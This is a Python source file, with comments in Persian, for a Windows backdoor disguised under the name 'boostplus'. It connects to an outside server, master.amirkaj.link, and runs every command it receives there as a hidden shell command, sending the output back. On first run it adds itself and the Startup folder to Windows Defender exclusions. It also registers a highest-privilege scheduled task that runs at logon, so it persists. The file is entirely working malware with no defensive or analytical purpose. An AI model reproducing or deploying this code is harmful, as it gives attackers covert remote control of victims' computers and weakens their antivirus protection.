import socket
import time
import subprocess
import os
import sys

SERVER_HOST = "master.amirkaj.link"
SERVER_PORT = 8080

def connect_to_server():
    while True:
        try:
            print(f"Trying to connect to {SERVER_HOST}:{SERVER_PORT}")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print("Connected to the server")
            return client_socket
        except (socket.error, ConnectionRefusedError):
            print("Connection failed. Retrying in 5 seconds...")
            time.sleep(5)

def create_task(target_dir):
    try:
        command = f'schtasks /create /tn boostplus /tr {target_dir} /sc onlogon /rl highest'
        subprocess.run(["powershell", "-Command", command], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
        print("Task created successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e}")

def add_to_defender_exclusion(path):
    try:
        # دستور PowerShell برای اضافه کردن استثنا
        command = f'Add-MpPreference -ExclusionPath "{path}"'
        subprocess.run(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW, check=True)
        print(f"Added exclusion for: {path}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to add exclusion: {e}")


def is_first_run():
    first_run_marker = os.path.join(os.getenv('APPDATA'), 'boostplus_first_run.txt')
    if not os.path.exists(first_run_marker):
        with open(first_run_marker, 'w') as f:
            f.write('This is the first run of boostplus.')
            f.close()
        return True
    else:
        return False

def main():
    # مرحله دوم: اگر اولین بار است که برنامه اجرا می‌شود، پوشه Startup و خود برنامه را به استثناهای Defender اضافه می‌کنیم
    if is_first_run():
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        add_to_defender_exclusion(os.path.abspath(sys.argv[0]))
        add_to_defender_exclusion(startup_dir)
        create_task(os.path.abspath(sys.argv[0]))

    while True:
        client_socket = connect_to_server()
        try:
            while True:
                command = client_socket.recv(1024).decode()
                if not command:
                    print("Disconnected from server")
                    break
                print(f"Command received: {command}")
                try:
                    result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT,creationflags=subprocess.CREATE_NO_WINDOW)
                except subprocess.CalledProcessError as e:
                    result = f"Error: {e.output}"
                client_socket.send(result.encode())
        except (socket.error, ConnectionResetError):
            print("Connection lost. Reconnecting...")
            client_socket.close()
    

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(e)
        input()